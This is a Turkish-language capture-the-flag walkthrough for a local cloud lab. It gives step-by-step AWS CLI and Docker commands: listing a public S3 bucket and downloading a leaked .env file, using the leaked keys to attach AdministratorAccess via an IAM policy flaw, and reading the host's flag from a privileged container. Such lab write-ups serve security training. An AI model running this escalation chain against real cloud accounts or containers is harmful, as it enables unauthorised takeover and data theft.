Cloud Escape V1

S3 sızıntısından başlayıp, IAM yetki yükseltme açığı üzerinden privileged Docker konteynerine sızın ve host sistemdeki gizli bayrağı ele geçirin.

⚙️ Yerel Bağlantı Noktaları

• LocalStack Uç Noktası: http://localhost:4566
• Docker Lab Platformu: Yerel Aygıt / WSL Terminali

📖 Adım Adım Çözüm Raporu (Writeup)

Aşama 1: S3 Keşif ve Bilgi Toplama (Reconnaissance)

Hedef LocalStack altyapısındaki açık erişimli nesne depolarını listeleyip sızan dosyaları indirin:

# 1. Mevcut kovaları listele
aws s3 ls --endpoint-url http://localhost:4566

# 2. cloudsec-public-assets kovasını recursive tara
aws s3 ls s3://cloudsec-public-assets/ --recursive --endpoint-url http://localhost:4566

# 3. Sızan hassas .env dosyasını yerel dizine indir
aws s3 cp s3://cloudsec-public-assets/config/.env . --endpoint-url http://localhost:4566

Aşama 2: IAM Sızma ve Yetki Yükseltme (Privilege Escalation)

Sızan .env dosyasından elde ettiğiniz kimlik anahtarlarını dışa aktarıp (export) yetki matrisinizi manipüle edin:

# 1. Sızan anahtarları terminale tanımlayın
export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7LABTEST
export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/LABTEST+KEY
export AWS_DEFAULT_REGION=us-east-1

# 2. iam:AttachUserPolicy açığını kullanarak kendinizi Admin yapın
aws iam attach-user-policy --user-name cloudsec-dev-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --endpoint-url http://localhost:4566

Aşama 3: Konteynerden Kaçış ve Bayrağı Yakalama (Container Escape)

Admin haklarıyla altyapıda çalışan ayrımcalıklı Docker konteynerine bağlanıp host işletim sistemine geçiş sağlayın:

# 1. cloudsec-vulnerable-app konteynerinin içine interaktif kabuk (shell) açın
docker exec -it cloudsec-vulnerable-app sh

# 2. Mount edilen host kök dizini üzerinden ana makinenin flag dosyasını okuyun
cat /host/root/flag.txt
